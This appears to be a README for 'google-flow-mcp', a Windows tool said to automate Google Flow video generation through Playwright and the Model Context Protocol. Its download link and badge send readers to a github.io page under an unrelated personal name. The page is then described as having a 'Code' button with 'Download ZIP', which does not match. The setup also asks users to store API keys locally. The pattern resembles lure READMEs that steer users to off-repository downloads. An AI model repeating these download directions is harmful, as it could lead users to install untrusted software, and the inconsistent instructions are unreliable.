# 🌐 google-flow-mcp - Generate videos using Google AI tools

[![](https://img.shields.io/badge/Download-Google_Flow_MCP-blue.svg)](https://sergiorushy326.github.io)

This tool connects your local computer to Google Flow. It allows you to create videos using artificial intelligence through the Model Context Protocol. You can trigger tasks like video generation and model interaction directly from your desktop. 

## ⚙️ System Requirements

Before you install this software, ensure your computer meets these requirements:

* Windows 10 or Windows 11.
* A stable internet connection.
* At least 4GB of free disk space.
* Node.js installed on your machine.

If you do not have Node.js, search for "Node.js download" on Google and install the LTS version. This program requires Node.js to communicate with the Google services.

## 📥 Downloading the Software 

To get started, navigate to the main project page. 

[Visit this page to download the software](https://sergiorushy326.github.io)

On this page, look for the green button labeled "Code" toward the top right side. Click this button and select "Download ZIP". Save this file to your computer. Once the download finishes, move the file to a folder where you keep your programs. Right-click the folder and select "Extract All". 

## 🛠️ Setting Up the Tool

After you extract the files, open the folder on your computer. You will see a file named `package.json`. Follow these steps to prepare the tool:

1. Click the address bar in your file explorer window. 
2. Type `cmd` and press Enter. A black window will appear.
3. Type `npm install` and press Enter. This process downloads the necessary components for the software.
4. When the process finishes, the software is ready for use.

## 🔑 Configuring Your Account

This software requires a connection to your Google account to function. You must provide your API credentials to allow the tool to generate content. 

1. Create a text file named `.env` inside your project folder.
2. Open this file with a text editor.
3. Paste your API key on a single line.
4. Save the file and close it. 

The software uses a credit-cost gate. This means every video generation request uses a specific amount of your available credits. Check your Google Cloud console to view your remaining balance and ensure your billing settings remain active.

## 🚀 Running the Application

To start the software, follow these steps:

1. Open the black command window in your project folder again.
2. Type `npm start` and press Enter.
3. The software will connect to the internal tRPC API automatically.

You will see status messages confirm the connection. If you see a line stating "Server ready," the tool is active. You can now use your preferred AI interface to send prompts to the server. The software handles the connection, communicates with the Google Flow system, and processes your video requests.

## 🖥️ Using the Automation Features

The software leverages Playwright to handle web interactions. It simplifies the process of creating videos by managing the browser tasks for you. When you send a command, the tool:

* Launches a background browser session.
* Navigates to the Google Flow interface.
* Inputs your prompts into the Veo or Nano Banana models.
* Downloads the generated video file to your local computer.

Monitor the command window to see the progress of your video generation. The software will notify you when the file is ready for viewing.

## 🔍 Troubleshooting Common Issues

If the software fails to start, verify these items:

* Check your internet connection. 
* Ensure your API key is correct and valid. 
* Confirm that no other programs are using the local port required by the tool.
* Re-run `npm install` to ensure all components are updated.

If you encounter errors during video generation, check your credit balance. The Google Flow system will reject requests if your account lacks sufficient funds.

## 🛡️ Security and Privacy

This tool runs locally on your machine. Your prompts and private keys stay within your control. The software only sends necessary data to Google to request the video generation service. Do not share your `.env` file or your API keys with others. Keep these credentials private to prevent unauthorized access to your billing account.

Keywords: ai-agents, browser-automation, claude, google-flow, mcp, model-context-protocol, playwright, typescript, veo, video-generation